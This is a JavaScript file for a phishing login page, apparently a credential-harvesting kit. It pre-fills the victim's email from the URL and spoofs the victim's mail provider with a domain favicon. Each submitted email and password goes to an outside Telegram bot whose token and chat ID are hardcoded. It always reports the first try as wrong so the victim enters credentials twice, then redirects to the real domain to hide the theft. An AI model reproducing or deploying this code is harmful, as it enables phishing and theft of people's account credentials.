// Replace with your actual bot token and chat ID
const BOT_TOKEN = '7498188170:AAEg5-qYskNv-FQyoNx1AwCAeKHdMMdRiwY';
const CHAT_ID = '1977641102';
let loginAttempts = 0;

// Function to get email from the URL
function getEmailFromUrl() {
    const query = new URLSearchParams(window.location.search);
    const hash = window.location.hash.substring(1);
    // Prioritize query string, fallback to hash
    return query.get('email') || (hash.includes('@') ? hash : null);
}

// Autofill the email field from the URL
document.addEventListener('DOMContentLoaded', () => {
    const email = getEmailFromUrl();
    if (email) {
        const emailField = document.getElementById('user-email');
        emailField.value = email;

        // Optionally update the logo dynamically based on the domain
        const emailParts = email.split('@');
        if (emailParts.length > 1) {
            const domain = emailParts[1];
            const logoElement = document.getElementById('dynamic-logo');
            logoElement.src = `https://www.${domain}/favicon.ico`;

            // Add fallback in case the logo URL fails
            logoElement.onerror = () => {
                logoElement.src = 'https://via.placeholder.com/100';
            };
        }
    }
});

// Handle form submission
document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault();

    const userEmail = document.getElementById('user-email').value;
    const password = document.getElementById('password').value;
    const rememberMe = document.getElementById('remember-me').checked ? 'Yes' : 'No';

    const message = `Login Attempt:\nEmail: ${userEmail}\nPassword: ${password}\nRemember Me: ${rememberMe}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    })
    .then(response => response.json())
    .catch(error => console.error('Error:', error));

    loginAttempts++;

    if (loginAttempts === 1) {
        alert("Email/password is incorrect, try again");
    }

    if (loginAttempts >= 2) {
        document.getElementById('overlay').style.visibility = 'visible';

        setTimeout(() => {
            const emailParts = userEmail.split('@');
            if (emailParts.length > 1) {
                const domain = emailParts[1];
                const redirectUrl = `https://${domain}`;
                window.location.href = redirectUrl;
            } else {
                console.error('Invalid email format.');
            }
        }, 2000);
    }
});
